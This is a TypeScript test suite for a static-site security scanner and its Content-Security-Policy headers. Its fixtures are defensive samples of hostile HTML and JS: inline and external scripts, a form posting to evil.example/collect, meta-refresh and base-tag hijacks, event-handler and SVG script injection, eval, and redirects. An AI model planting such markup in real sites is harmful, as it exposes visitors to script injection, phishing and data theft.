import { readdirSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { describe, expect, it } from "vitest";
import { publishedSiteHeaders, scanBuiltSite } from "./scan";

const f = (path: string, text: string) => ({ path, data: Buffer.from(text) });
const good = `<!doctype html><html><head><script type="module" crossorigin src="/assets/index-AbC1.js"></script></head><body><a href="/menu">Menu</a><a href="tel:+251911">Call</a></body></html>`;

describe("scanBuiltSite", () => {
  it("accepts a normal built site", () => {
    expect(
      scanBuiltSite([f("index.html", good), f("menu/index.html", good), f("assets/index-AbC1.js", "console.log(1)"), f("assets/index.css", "a{}"), f("fonts/noto.woff2", ""), f("robots.txt", ""), f("sitemap.xml", ""), f("favicon.svg", "<svg></svg>")]),
    ).toEqual([]);
  });

  it.each([
    ["inline-script", `<script>alert(1)</script>`],
    ["external-script", `<script src="https://evil.example/x.js"></script>`],
    ["iframe-tag", `<iframe src="https://bank.example"></iframe>`],
    ["script-url", `<a href="javascript:alert(1)">x</a>`],
    ["meta-refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
    ["inline-handler", `<img src="/a.png" onerror="alert(1)">`],
    ["password-field", `<input type="password" name="pin">`],
    ["external-form", `<form action="https://evil.example/collect"><input name="x"></form>`],
    ["base-tag", `<base href="https://evil.example/">`],
  ])("flags %s", (rule, html) => {
    const issues = scanBuiltSite([f("index.html", good.replace("<body>", `<body>${html}`))]);
    expect(issues.map((i) => i.rule)).toContain(rule);
  });

  it("allows JSON-LD data blocks but not other inline scripts", () => {
    const html = good.replace("<body>", `<body><script type="application/ld+json">{"@type":"LocalBusiness"}</script>`);
    expect(scanBuiltSite([f("index.html", html)])).toEqual([]);
    const sneaky = good.replace("<body>", `<body><script type="text/javascript">alert(1)</script>`);
    expect(scanBuiltSite([f("index.html", sneaky)]).map((i) => i.rule)).toContain("inline-script");
  });

  it("allows forms that post to the Data API", () => {
    const html = good.replace("<body>", `<body><form action="https://api.gojoline.com/sites/1/forms"></form>`);
    expect(scanBuiltSite([f("index.html", html)], { allowedFormOrigins: ["https://api.gojoline.com"] })).toEqual([]);
  });

  it("flags password fields and eval in the bundle, scripts in SVGs and odd files", () => {
    const rules = scanBuiltSite([
      f("index.html", good),
      f("assets/a.js", `createElement("input",{type:"password"})`),
      f("assets/b.js", `eval("x")`),
      f("favicon.svg", `<svg onload="alert(1)"></svg>`),
      f("run.php", "<?php ?>"),
    ]).map((i) => i.rule);
    expect(rules).toEqual(expect.arrayContaining(["password-field", "eval", "svg-script", "file-type"]));
  });

  it.each(["vercel.json", "api/x.js", "middleware.js", ".vercel/output/config.json", "data.json", "assets/../x.js", "sub/page.js"])("only allows known file paths: rejects %s", (path) => {
    const rules = scanBuiltSite([f("index.html", good), f(path, "{}")]).map((i) => i.rule);
    expect(rules).toContain(path.includes("..") ? "bad-path" : "file-type");
  });

  it("does not mistake comparisons for redirects", () => {
    expect(scanBuiltSite([f("index.html", good), f("assets/a.js", "n=typeof t.contentWindow.location.href==`string`")])).toEqual([]);
  });

  it("flags redirects in the bundle", () => {
    expect(scanBuiltSite([f("index.html", good), f("assets/a.js", 'window.location.href="https://evil.example"')]).map((i) => i.rule)).toContain("redirect");
  });

  it("requires an index page", () => {
    expect(scanBuiltSite([f("about.html", good)]).map((i) => i.rule)).toContain("missing-index");
  });
});

describe("publishedSiteHeaders", () => {
  it("is a strict CSP that only adds the Data API origin", () => {
    const csp = publishedSiteHeaders({ dataApiOrigin: "https://api.gojoline.com" }).find((h) => h.key === "Content-Security-Policy")!.value;
    expect(csp).toContain("script-src 'self';");
    expect(csp).toContain("form-action 'self' https://api.gojoline.com");
    expect(csp).toContain("frame-ancestors 'none'");
  });
});

describe("the site template's public folder", () => {
  it("holds only files a published site may contain (anything else would block every publish)", () => {
    const root = join(process.cwd(), "templates", "site", "public");
    const files: string[] = [];
    const walk = (dir: string) => {
      for (const name of readdirSync(dir)) {
        const full = join(dir, name);
        if (statSync(full).isDirectory()) walk(full);
        else files.push(relative(root, full).replace(/\\/g, "/"));
      }
    };
    walk(root);
    expect(files.length).toBeGreaterThan(0);
    const issues = scanBuiltSite([f("index.html", good), ...files.map((p) => f(p, ""))]);
    expect(issues.filter((i) => i.rule === "file-type")).toEqual([]);
  });
});
